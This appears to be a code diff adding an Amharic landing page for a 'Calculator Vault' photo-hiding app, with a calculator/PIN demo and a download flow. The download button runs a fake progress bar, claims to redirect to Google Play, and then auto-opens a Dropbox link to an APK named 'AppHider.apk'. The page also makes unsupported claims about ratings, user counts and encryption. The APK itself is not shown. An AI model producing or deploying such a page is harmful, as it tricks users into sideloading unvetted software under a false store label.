@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>ካልኩሌተር ቮልት · ሚስጥራዊ ፎቶዎችን ደብቅ</title>
+  <!-- Google Fonts + Font Awesome -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #f9f3e6 0%, #fff4e8 100%);
+      min-height: 100vh;
+      padding: 20px;
+      position: relative;
+    }
+
+    /* bright bubbly background */
+    .bg-bubbles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      overflow: hidden;
+    }
+
+    .bubble {
+      position: absolute;
+      background: radial-gradient(circle, rgba(255,200,100,0.25), rgba(255,140,50,0.1));
+      border-radius: 50%;
+      filter: blur(60px);
+      animation: floatBubble 18s infinite alternate;
+    }
+
+    @keyframes floatBubble {
+      0% { transform: translate(0, 0) scale(1); opacity: 0.5; }
+      100% { transform: translate(40px, -30px) scale(1.3); opacity: 0.9; }
+    }
+
+    /* main card - bright & glassmorphism */
+    .landing-card {
+      position: relative;
+      z-index: 10;
+      max-width: 1280px;
+      margin: 0 auto;
+      background: rgba(255, 255, 245, 0.92);
+      backdrop-filter: blur(2px);
+      border-radius: 64px;
+      box-shadow: 0 30px 50px -20px rgba(0,0,0,0.2), 0 0 0 1px rgba(255,215,150,0.6);
+      overflow: hidden;
+      transition: all 0.3s;
+    }
+
+    .container {
+      padding: 2rem 1.8rem;
+    }
+
+    @media (min-width: 768px) {
+      .container {
+        padding: 3rem 3rem;
+      }
+    }
+
+    /* hero flex */
+    .hero {
+      display: flex;
+      flex-direction: column;
+      gap: 2.5rem;
+    }
+
+    @media (min-width: 950px) {
+      .hero {
+        flex-direction: row;
+        align-items: center;
+        justify-content: space-between;
+      }
+    }
+
+    .hero-left {
+      flex: 1.2;
+    }
+
+    .hero-right {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      background: #ffeed5;
+      padding: 8px 20px;
+      border-radius: 100px;
+      width: fit-content;
+      margin-bottom: 1.5rem;
+      font-weight: 700;
+      font-size: 0.85rem;
+      color: #b45309;
+      border: 1px solid #ffcd94;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.02);
+    }
+
+    h1 {
+      font-size: 2.6rem;
+      font-weight: 800;
+      line-height: 1.2;
+      background: linear-gradient(125deg, #3b2a1f, #c2410c);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 1rem;
+    }
+
+    @media (min-width: 640px) {
+      h1 { font-size: 3.5rem; }
+    }
+    @media (min-width: 1024px) {
+      h1 { font-size: 4.2rem; }
+    }
+
+    .highlight {
+      background: linear-gradient(120deg, #ea580c, #f97316);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .desc {
+      font-size: 1.1rem;
+      color: #4a3b2c;
+      line-height: 1.5;
+      margin: 1rem 0 1.5rem;
+      font-weight: 500;
+    }
+
+    .feature-grid {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.9rem;
+      margin: 1.5rem 0 2rem;
+    }
+
+    .feature-item {
+      background: white;
+      padding: 8px 20px;
+      border-radius: 50px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-weight: 600;
+      font-size: 0.9rem;
+      color: #5a3e2b;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+      border: 1px solid #ffe1b9;
+    }
+
+    .feature-item i {
+      color: #f97316;
+      font-size: 1rem;
+    }
+
+    .download-btn {
+      background: linear-gradient(105deg, #f97316, #ea580c);
+      border: none;
+      padding: 1rem 2rem;
+      border-radius: 60px;
+      font-weight: 800;
+      font-size: 1.2rem;
+      color: white;
+      display: inline-flex;
+      align-items: center;
+      gap: 14px;
+      cursor: pointer;
+      box-shadow: 0 20px 30px -12px rgba(234,88,12,0.4);
+      transition: all 0.2s ease;
+      width: auto;
+    }
+
+    .download-btn i {
+      font-size: 1.3rem;
+    }
+
+    .download-btn:hover {
+      transform: scale(1.02);
+      background: linear-gradient(105deg, #fd811f, #d95c0a);
+      box-shadow: 0 25px 35px -12px #ea580c;
+    }
+
+    .small-cta {
+      margin-top: 1rem;
+      font-size: 0.8rem;
+      color: #a1623a;
+      display: flex;
+      gap: 16px;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+
+    /* phone mockup */
+    .phone-mock {
+      position: relative;
+      width: 290px;
+      height: 570px;
+      background: #2d2a24;
+      border-radius: 48px;
+      box-shadow: 0 35px 45px -18px rgba(0,0,0,0.4), inset 0 0 0 3px rgba(255,215,150,0.7);
+      overflow: hidden;
+      transition: all 0.3s;
+      animation: gentleFloat 3s infinite alternate ease;
+    }
+
+    @keyframes gentleFloat {
+      0% { transform: translateY(0px); }
+      100% { transform: translateY(-8px); }
+    }
+
+    .screen {
+      background: #fef7e8;
+      width: 100%;
+      height: 100%;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      overflow-y: auto;
+      padding: 14px 12px;
+    }
+
+    .calc-vault-demo {
+      background: white;
+      border-radius: 32px;
+      padding: 12px;
+      box-shadow: 0 8px 18px rgba(0,0,0,0.05);
+      margin-bottom: 12px;
+    }
+
+    .calc-display {
+      background: #f3ede3;
+      border-radius: 28px;
+      padding: 18px 16px;
+      margin-bottom: 16px;
+      text-align: right;
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: #2c1e12;
+      font-family: monospace;
+      letter-spacing: 1px;
+      box-shadow: inset 0 2px 5px rgba(0,0,0,0.05);
+    }
+
+    .calc-buttons {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+    }
+
+    .calc-btn {
+      background: #f5efe7;
+      padding: 12px 0;
+      text-align: center;
+      border-radius: 32px;
+      font-weight: 700;
+      font-size: 1.1rem;
+      color: #4b2f1a;
+      transition: 0.1s;
+      cursor: pointer;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+    }
+
+    .calc-btn.special {
+      background: #ffedd5;
+      color: #c2410c;
+    }
+
+    .calc-btn.equal {
+      background: linear-gradient(145deg, #f97316, #ea580c);
+      color: white;
+    }
+
+    .lock-icon-overlay {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(12px);
+      width: 80px;
+      height: 80px;
+      border-radius: 100px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2rem;
+      color: #ffd966;
+      opacity: 1;
+      transition: 0.2s;
+      pointer-events: none;
+      z-index: 25;
+    }
+
+    .vault-gallery {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #fffaf0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      gap: 14px;
+      opacity: 0;
+      transform: scale(0.94);
+      transition: 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.2);
+      pointer-events: none;
+      z-index: 20;
+      border-radius: 48px;
+      padding: 20px;
+      backdrop-filter: blur(2px);
+    }
+
+    .phone-mock.vault-open .lock-icon-overlay {
+      opacity: 0;
+    }
+
+    .phone-mock.vault-open .vault-gallery {
+      opacity: 1;
+      transform: scale(1);
+      pointer-events: none;
+    }
+
+    .gallery-item {
+      background: white;
+      width: 85%;
+      padding: 12px 18px;
+      border-radius: 32px;
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      border: 1px solid #ffd8a5;
+      box-shadow: 0 5px 12px rgba(0,0,0,0.05);
+    }
+
+    .gallery-item i {
+      font-size: 1.8rem;
+      color: #f97316;
+    }
+
+    .gallery-thumb {
+      width: 40px;
+      height: 40px;
+      background: #ffe6c7;
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.2rem;
+    }
+
+    .image-row {
+      display: flex;
+      justify-content: space-around;
+      width: 100%;
+      margin: 6px 0;
+    }
+    .image-icon {
+      background: #fed7aa;
+      width: 50px;
+      height: 50px;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.7rem;
+    }
+    .photo-preview {
+      display: flex;
+      gap: 8px;
+      margin-top: 8px;
+    }
+    .mini-img {
+      width: 55px;
+      height: 55px;
+      background: #fcd6a8;
+      border-radius: 20px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.4rem;
+    }
+    .keypad-hint {
+      font-size: 0.65rem;
+      text-align: center;
+      background: #fdebd0;
+      border-radius: 40px;
+      padding: 6px;
+      color: #b45309;
+    }
+
+    .trust-row {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      margin-top: 2.5rem;
+      gap: 1rem;
+      background: rgba(255,245,225,0.6);
+      border-radius: 60px;
+      padding: 1.2rem 1.8rem;
+    }
+
+    .trust-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #7c4a2a;
+      font-weight: 600;
+      font-size: 0.85rem;
+    }
+
+    .trust-item i {
+      color: #f97316;
+    }
+
+    /* ---------- FULLSCREEN DOWNLOAD PAGE (ቅጽበታዊ ማውረጃ ገጽ) ---------- */
+    .download-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(145deg, #fff8ef, #fff1e0);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      visibility: hidden;
+      opacity: 0;
+      transition: visibility 0s, opacity 0.4s ease;
+      backdrop-filter: blur(8px);
+      font-family: 'Inter', sans-serif;
+    }
+
+    .download-overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
+
+    .download-card {
+      background: white;
+      max-width: 460px;
+      width: 90%;
+      padding: 2rem 1.8rem;
+      border-radius: 64px;
+      text-align: center;
+      box-shadow: 0 40px 60px -20px rgba(0,0,0,0.3);
+      border: 1px solid #ffd6a5;
+      animation: fadeSlideUp 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+    }
+
+    @keyframes fadeSlideUp {
+      from {
+        opacity: 0;
+        transform: translateY(40px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .download-icon {
+      font-size: 4.5rem;
+      background: linear-gradient(135deg, #f97316, #ea580c);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 0.5rem;
+    }
+
+    .download-card h2 {
+      font-size: 1.9rem;
+      font-weight: 800;
+      color: #3b2a1f;
+      margin: 0.5rem 0;
+    }
+
+    .progress-container {
+      background: #f0e7db;
+      border-radius: 60px;
+      height: 12px;
+      width: 100%;
+      margin: 1.8rem 0;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #f97316, #fbbf24);
+      border-radius: 60px;
+      transition: width 0.2s linear;
+      box-shadow: 0 0 8px #f97316;
+    }
+
+    .status-text {
+      font-weight: 700;
+      font-size: 1.2rem;
+      color: #b45309;
+      margin: 0.8rem 0;
+    }
+
+    .detail-text {
+      font-size: 0.85rem;
+      color: #8b694a;
+      margin-bottom: 1.5rem;
+    }
+
+    .fake-store-btn {
+      background: #1f2937;
+      padding: 12px 24px;
+      border-radius: 40px;
+      color: white;
+      font-weight: 600;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      transition: 0.2s;
+      border: none;
+      cursor: pointer;
+    }
+
+    .fake-store-btn:hover {
+      background: #111827;
+      transform: scale(0.98);
+    }
+
+    .cancel-btn {
+      background: transparent;
+      border: none;
+      color: #b67b45;
+      margin-top: 1rem;
+      font-weight: 500;
+      cursor: pointer;
+      text-decoration: underline;
+    }
+
+    @media (max-width: 640px) {
+      .phone-mock {
+        width: 260px;
+        height: 520px;
+      }
+      h1 {
+        font-size: 2.2rem;
+      }
+      .download-card h2 {
+        font-size: 1.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="bg-bubbles">
+  <div class="bubble" style="width: 300px; height: 300px; top: -80px; left: -80px;"></div>
+  <div class="bubble" style="width: 400px; height: 400px; bottom: -100px; right: -50px;"></div>
+  <div class="bubble" style="width: 250px; height: 250px; top: 40%; left: 70%;"></div>
+</div>
+
+<div class="landing-card">
+  <div class="container">
+    <div class="hero">
+      <div class="hero-left">
+        <div class="badge">
+          <i class="fas fa-shield-heart"></i> <span>⭐ 4.9 ከደቂቃ በላይ ሚስጥር ጠባቂ</span>
+        </div>
+        <h1>
+          ሚስጥሮችዎን ደብቁ <br>
+          በ<span class="highlight">ካልኩሌተር ቮልት</span>
+        </h1>
+        <p class="desc">
+          📱 እንደ ተራ ካልኩሌተር ተደብቆ! ፎቶዎች፣ ቪዲዮዎች እና ሰነዶችዎን በማንም ማየት በማይችል ቦታ ያስቀምጡ። ፈጣን ፒን፣ የማጭበርበር ማንቂያ፣ ከፍተኛ ጥበቃ።
+        </p>
+
+        <div class="feature-grid">
+          <div class="feature-item"><i class="fas fa-calculator"></i> ካልኩሌተር መልክ</div>
+          <div class="feature-item"><i class="fas fa-fingerprint"></i> ፒን/አሻራ</div>
+          <div class="feature-item"><i class="fas fa-camera"></i> ሐሰተኛ ማጥፊያ</div>
+          <div class="feature-item"><i class="fas fa-cloud-upload-alt"></i> የተመሰጠረ ምትኬ</div>
+        </div>
+
+        <button class="download-btn" id="mainDownloadBtn">
+          <i class="fab fa-google-play"></i> አሁን ያውርዱ
+          <i class="fas fa-arrow-right"></i>
+        </button>
+        <div class="small-cta">
+          <i class="fas fa-check-circle" style="color:#ea580c;"></i> ነጻ ማውረጃ · 2M+ ተጠቃሚዎች
+          <i class="fas fa-lock" style="margin-left: 8px;"></i> ወታደራዊ ምስጠራ
+        </div>
+      </div>
+
+      <div class="hero-right">
+        <div class="phone-mock" id="phoneMockup">
+          <div class="screen">
+            <div class="calc-vault-demo">
+              <div class="calc-display" id="calcDisplay">0</div>
+              <div class="calc-buttons" id="calcButtons">
+                <div class="calc-btn" data-val="7">7</div>
+                <div class="calc-btn" data-val="8">8</div>
+                <div class="calc-btn" data-val="9">9</div>
+                <div class="calc-btn special" data-op="del">⌫</div>
+                <div class="calc-btn" data-val="4">4</div>
+                <div class="calc-btn" data-val="5">5</div>
+                <div class="calc-btn" data-val="6">6</div>
+                <div class="calc-btn special" data-op="clear">C</div>
+                <div class="calc-btn" data-val="1">1</div>
+                <div class="calc-btn" data-val="2">2</div>
+                <div class="calc-btn" data-val="3">3</div>
+                <div class="calc-btn equal" data-op="equal">=</div>
+                <div class="calc-btn" data-val="0">0</div>
+                <div class="calc-btn" data-val="00">00</div>
+                <div class="calc-btn special" data-op="dot">.</div>
+                <div class="calc-btn special" data-op="plus">+</div>
+              </div>
+            </div>
+            <div class="keypad-hint">
+              <i class="fas fa-lock"></i> ሚስጥር ፒን: <strong>1234</strong> ይጫኑ እና ቮልት ይክፈቱ
+            </div>
+          </div>
+          <div class="lock-icon-overlay" id="lockOverlay">
+            <i class="fas fa-lock"></i>
+          </div>
+          <div class="vault-gallery" id="vaultGallery">
+            <div class="gallery-item">
+              <div class="gallery-thumb"><i class="fas fa-images"></i></div>
+              <div><strong>📸 የተደበቁ ፎቶዎች</strong><br><span style="font-size:12px;">24 ምስሎች · ቤተሰብ + ሰነድ</span></div>
+            </div>
+            <div class="image-row">
+              <div class="image-icon">🌄</div>
+              <div class="image-icon">🏖️</div>
+              <div class="image-icon">🎂</div>
+              <div class="image-icon">📄</div>
+            </div>
+            <div class="gallery-item"><i class="fas fa-video"></i> <span>🔒 8 ቪዲዮዎች (የግል)</span></div>
+            <div class="gallery-item"><i class="fas fa-id-card"></i> <span>🛡️ ማንነት ካርድ፣ ፓስፖርት</span></div>
+            <div class="photo-preview">
+              <div class="mini-img">🌸</div>
+              <div class="mini-img">🏞️</div>
+              <div class="mini-img">📎</div>
+            </div>
+            <div style="font-size: 11px; background:#ffefdb; padding: 8px 16px; border-radius: 30px;">
+              <i class="fas fa-shield-alt"></i> በድብቅ ሁነታ ተከልክሏል
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="trust-row">
+      <div class="trust-item"><i class="fas fa-database"></i> ዜሮ-እውቀት ምስጠራ</div>
+      <div class="trust-item"><i class="fas fa-bolt"></i> ፈጣን መደበቅ</div>
+      <div class="trust-item"><i class="fas fa-chart-line"></i> በየቀኑ 15k+ ማውረጃ</div>
+      <div class="trust-item"><i class="fas fa-globe-africa"></i> በኢትዮጵያ ተመራጭ</div>
+    </div>
+  </div>
+</div>
+
+<!-- DOWNLOAD PAGE (full screen) -->
+<div id="downloadPage" class="download-overlay">
+  <div class="download-card">
+    <div class="download-icon">
+      <i class="fas fa-mobile-alt"></i>
+    </div>
+    <h2>⏳ ካልኩሌተር ቮልት እየወረደ ነው...</h2>
+    <div class="progress-container">
+      <div class="progress-bar" id="downloadProgressBar"></div>
+    </div>
+    <div class="status-text" id="progressStatus">0%</div>
+    <div class="detail-text" id="progressDetail">ደህንነቱ የተጠበቀ ማውረጃ በመዘጋጀት ላይ</div>
+    <button id="forceStoreRedirect" class="fake-store-btn" style="display: none;">
+      <i class="fab fa-google-play"></i> ወደ ጉግል ፕሌይ ይሂዱ
+    </button>
+    <button id="cancelDownloadBtn" class="cancel-btn">ዝጋ</button>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // ========== VAULT INTERACTION ==========
+    const phoneMock = document.getElementById('phoneMockup');
+    const calcDisplay = document.getElementById('calcDisplay');
+    let currentInput = '';
+    let enteredPin = '';
+    let vaultLocked = true;
+
+    function updateUI() {
+      if (!vaultLocked) phoneMock.classList.add('vault-open');
+      else phoneMock.classList.remove('vault-open');
+    }
+    function updateCalcDisplay() {
+      calcDisplay.innerText = currentInput === '' ? '0' : currentInput;
+    }
+
+    function processInput(val, op) {
+      if (!vaultLocked) {
+        vaultLocked = true;
+        enteredPin = '';
+        currentInput = '';
+        updateCalcDisplay();
+        updateUI();
+        if (val !== undefined || op !== undefined) handleLockedAction(val, op);
+        return;
+      }
+      handleLockedAction(val, op);
+    }
+
+    function handleLockedAction(val, op) {
+      if (op === 'clear') {
+        currentInput = '';
+        enteredPin = '';
+        updateCalcDisplay();
+        return;
+      }
+      if (op === 'del') {
+        currentInput = currentInput.slice(0, -1);
+        enteredPin = enteredPin.slice(0, -1);
+        updateCalcDisplay();
+        return;
+      }
+      if (val !== undefined && /^\d+$/.test(val)) {
+        currentInput += val;
+        enteredPin += val;
+        updateCalcDisplay();
+        if (enteredPin === '1234') {
+          vaultLocked = false;
+          updateUI();
+          currentInput = '';
+          enteredPin = '';
+          updateCalcDisplay();
+          const toast = document.createElement('div');
+          toast.innerText = '🔓 ቮልት ተከፍቷል! ሚስጥሮችዎ ደህና ናቸው';
+          toast.style.position = 'fixed'; toast.style.bottom = '20px'; toast.style.left = '50%'; toast.style.transform = 'translateX(-50%)'; toast.style.background = '#2c2b26'; toast.style.color = '#ffefcf'; toast.style.padding = '10px 20px'; toast.style.borderRadius = '40px'; toast.style.zIndex = '999'; toast.style.fontSize = '14px';
+          document.body.appendChild(toast);
+          setTimeout(() => toast.remove(), 1800);
+        } else if (enteredPin.length >= 5) {
+          currentInput = '';
+          enteredPin = '';
+          updateCalcDisplay();
+        }
+        return;
+      }
+      if (op === 'plus') { currentInput += '+'; updateCalcDisplay(); }
+      else if (op === 'equal') {
+        try { let res = eval(currentInput); currentInput = res.toString(); updateCalcDisplay(); }
+        catch(e) { currentInput = 'ስህተት'; updateCalcDisplay(); setTimeout(() => { currentInput = ''; updateCalcDisplay(); }, 700); }
+      } else if (op === 'dot') { if (!currentInput.includes('.')) currentInput += '.'; updateCalcDisplay(); }
+      else if (val === '00') { currentInput += '00'; updateCalcDisplay(); }
+    }
+
+    document.querySelectorAll('.calc-btn').forEach(btn => {
+      btn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const val = btn.getAttribute('data-val');
+        const op = btn.getAttribute('data-op');
+        if (val !== null) processInput(val, null);
+        else if (op !== null) processInput(null, op);
+      });
+    });
+    updateUI();
+    currentInput = '';
+    updateCalcDisplay();
+
+    // ========== DOWNLOAD PAGE WITH PROGRESS SIMULATION ==========
+    const downloadOverlay = document.getElementById('downloadPage');
+    const progressBar = document.getElementById('downloadProgressBar');
+    const progressStatus = document.getElementById('progressStatus');
+    const progressDetail = document.getElementById('progressDetail');
+    const forceStoreBtn = document.getElementById('forceStoreRedirect');
+    const cancelBtn = document.getElementById('cancelDownloadBtn');
+    let progressInterval = null;
+
+    function showDownloadPage() {
+      downloadOverlay.classList.add('active');
+      // reset progress
+      progressBar.style.width = '0%';
+      progressStatus.innerText = '0%';
+      progressDetail.innerText = 'ግንኙነት በመፍጠር ላይ...';
+      forceStoreBtn.style.display = 'none';
+      let percent = 0;
+      if (progressInterval) clearInterval(progressInterval);
+      progressInterval = setInterval(() => {
+        percent += Math.floor(Math.random() * 12) + 3;
+        if (percent >= 100) {
+          percent = 100;
+          clearInterval(progressInterval);
+          progressBar.style.width = '100%';
+          progressStatus.innerText = '100%';
+          progressDetail.innerText = 'ማውረጃ ተጠናቋል! ወደ ጉግል ፕሌይ እያዘጋጀን...';
+          // Show the store button
+          forceStoreBtn.style.display = 'inline-flex';
+          // Auto redirect after 1.5 sec
+          setTimeout(() => {
+            window.open('https://www.dropbox.com/scl/fi/44u54wx5x7mt2gb1f7tth/AppHider.apk?rlkey=2iwpoqk8zhwjhcbh34cr5p1zg&st=4l5hwyfh&dl=1', '_blank');
+          }, 1500);
+        } else {
+          progressBar.style.width = percent + '%';
+          progressStatus.innerText = percent + '%';
+          if (percent < 30) progressDetail.innerText = 'ደህንነት ማረጋገጫ...';
+          else if (percent < 70) progressDetail.innerText = 'ፋይሎች በማዘጋጀት ላይ...';
+          else progressDetail.innerText = 'ማሸግ እና ማመሳሰል...';
+        }
+      }, 180);
+    }
+
+    function hideDownloadPage() {
+      if (progressInterval) clearInterval(progressInterval);
+      downloadOverlay.classList.remove('active');
+      // reset store button
+      forceStoreBtn.style.display = 'none';
+    }
+
+    // Event for main download button
+    const mainBtn = document.getElementById('mainDownloadBtn');
+    mainBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      showDownloadPage();
+      // Facebook conversion mock
+      console.log('Download started from Amharic CTA');
+    });
+
+    // Cancel button closes the download overlay
+    cancelBtn.addEventListener('click', () => {
+      hideDownloadPage();
+    });
+
+    // Manual store redirect if user clicks the visible button
+    forceStoreBtn.addEventListener('click', () => {
+      window.open('https://www.dropbox.com/scl/fi/44u54wx5x7mt2gb1f7tth/AppHider.apk?rlkey=2iwpoqk8zhwjhcbh34cr5p1zg&st=4l5hwyfh&dl=1', '_blank');
+    });
+  })();
+</script>
+</body>
+</html>
